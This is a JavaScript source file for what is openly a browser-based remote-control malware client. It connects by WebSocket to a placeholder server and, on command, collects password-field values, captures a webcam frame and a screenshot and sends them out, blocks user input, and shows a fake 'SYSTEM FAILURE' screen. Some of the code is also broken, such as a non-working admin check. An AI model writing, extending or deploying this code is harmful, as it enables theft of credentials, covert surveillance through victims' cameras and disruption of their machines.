const ws = new WebSocket('ws://your-server:3000', { headers: { 'x-user-id': 'default' } });

ws.onopen = () => {
    ws.send(JSON.stringify({ id: 'initial' }));
};

ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    if (data.id) {
        const clientId = data.id;

        const stealPasswords = () => {
            const inputs = document.getElementsByTagName('input');
            const passwords = [];
            for (let input of inputs) {
                if (input.type === 'password') passwords.push(input.value);
            }
            ws.send(JSON.stringify({ id: clientId, passwords }));
        };

        const stealWebcam = () => {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    const imageData = canvas.toDataURL('image/jpeg');
                    ws.send(JSON.stringify({ id: clientId, webcam: imageData }));
                    stream.getTracks().forEach(track => track.stop());
                })
                .catch(() => ws.send(JSON.stringify({ id: clientId, webcam: 'Failed' })));
        };

        const takeScreenshot = () => {
            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const context = canvas.getContext('2d');
            context.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
            const screenshot = canvas.toDataURL('image/png');
            ws.send(JSON.stringify({ id: clientId, screenshot }));
        };

        const applyGDIEffect = (effect) => {
            const canvas = document.createElement('canvas');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            document.body.appendChild(canvas);
            const ctx = canvas.getContext('2d');
            ctx.fillStyle = effect === 'invert' ? 'white' : 'red';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            setTimeout(() => document.body.removeChild(canvas), 2000);
        };

        const triggerBluescreen = () => {
            const bluescreen = document.createElement('div');
            bluescreen.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:blue;color:white;font-size:40px;text-align:center;padding-top:20%;';
            bluescreen.textContent = 'SYSTEM FAILURE';
            document.body.appendChild(bluescreen);
            setTimeout(() => document.body.removeChild(bluescreen), 5000);
        };

        const blockInputs = () => {
            document.addEventListener('keydown', (e) => e.preventDefault());
            document.addEventListener('mousedown', (e) => e.preventDefault());
        };

        const checkAdmin = () => {
            const isAdmin = window.navigator.userAgent.includes('Admin') || false;
            ws.send(JSON.stringify({ id: clientId, adminCheck: isAdmin }));
        };

        ws.onmessage = (cmdEvent) => {
            const cmdData = JSON.parse(cmdEvent.data);
            if (cmdData.command) {
                switch (cmdData.command.toLowerCase()) {
                    case 'stealpasswords':
                        stealPasswords();
                        ws.send(JSON.stringify({ id: clientId, response: 'Passwords stolen' }));
                        break;
                    case 'stealwebcam':
                        stealWebcam();
                        ws.send(JSON.stringify({ id: clientId, response: 'Webcam captured' }));
                        break;
                    case 'takescreenshot':
                        takeScreenshot();
                        ws.send(JSON.stringify({ id: clientId, response: 'Screenshot taken' }));
                        break;
                    case 'gdieffect':
                        applyGDIEffect(cmdData.args[0] || 'invert');
                        ws.send(JSON.stringify({ id: clientId, response: 'GDI effect applied' }));
                        break;
                    case 'bluescreen':
                        triggerBluescreen();
                        ws.send(JSON.stringify({ id: clientId, response: 'Bluescreen triggered' }));
                        break;
                    case 'blockinputs':
                        blockInputs();
                        ws.send(JSON.stringify({ id: clientId, response: 'Inputs blocked' }));
                        break;
                    case 'admincheck':
                        checkAdmin();
                        ws.send(JSON.stringify({ id: clientId, response: `Admin status: ${checkAdmin()}` }));
                        break;
                    case 'help':
                        ws.send(JSON.stringify({ id: clientId, response: 'Commands: stealpasswords, stealwebcam, takescreenshot, gdieffect [invert/red], bluescreen, blockinputs, admincheck, help' }));
                        break;
                }
            }
        };
    }
};
